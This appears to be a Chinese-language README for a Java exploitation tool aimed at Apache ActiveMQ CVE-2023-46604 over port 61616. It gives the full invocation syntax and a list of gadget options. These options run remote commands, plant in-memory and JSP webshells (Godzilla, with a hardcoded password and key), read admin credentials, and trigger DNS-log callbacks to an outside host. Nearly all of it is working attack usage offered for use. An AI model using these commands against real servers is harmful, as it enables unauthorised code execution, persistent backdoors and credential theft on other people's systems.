``
ActiveMQ CVE-2023-46604 61616端口利用工具

安全版本>= 5.18.3/5.17.6/5.16.7

java -jar ActiveMQExp.jar rhost=rhost lhost=lhost gadget=gadget cmd=cmd

例如

java -jar ActiveMQExp.jar rhost=127.0.0.1 lhost=127.0.0.1 gadget=cb19 cmd=whoami

默认 rport=61616 ldapport=1389 httpport=9998

目前支持的gadget如下

gadget=wincmd cmd=whoami //无回显

gadget=linuxcmd cmd=whoami //无回显

gadget=spelcmd cmd=whoami //无回显

gadget=spelecho cmd=whoami //有回显 from Hutt0n0

gadget=spelclass cmd=memcmd //内存马 from Hutt0n0 http://rhost:8161/admin/memshell?cmd=whoami

gadget=spelclass cmd=memgodzilla //内存马 http://rhost:8161/admin/memgodzilla pass:Tas9er key:B7VO2sAamj

gadget=spelclass cmd=readfile //读8186账户密码并且请求一次8186/admin/

gadget=spelclass cmd=whoami //有回显

gadget=spelclass cmd=cmdjsp // http://rhost:8161/api/cmd.jsp

gadget=spelclass cmd=godzillajsp // http://rhost:8161/api/godzillajsp pass:Tas9er key:B7VO2sAamj

gadget=urldns cmd=xxx.dnslog.cn

gadget=cb18 cmd=whoami //有回显

gadget=cb18 cmd=cmdjsp

gadget=cb18 cmd=godzillajsp

gadget=cb18 cmd=readfile

gadget=cb18 cmd=memgodzilla

gadget=cb19 cmd=whoami //有回显

gadget=cb19 cmd=cmdjsp

gadget=cb19 cmd=godzillajsp

gadget=cb19 cmd=readfile

gadget=cb19 cmd=memgodzilla

``
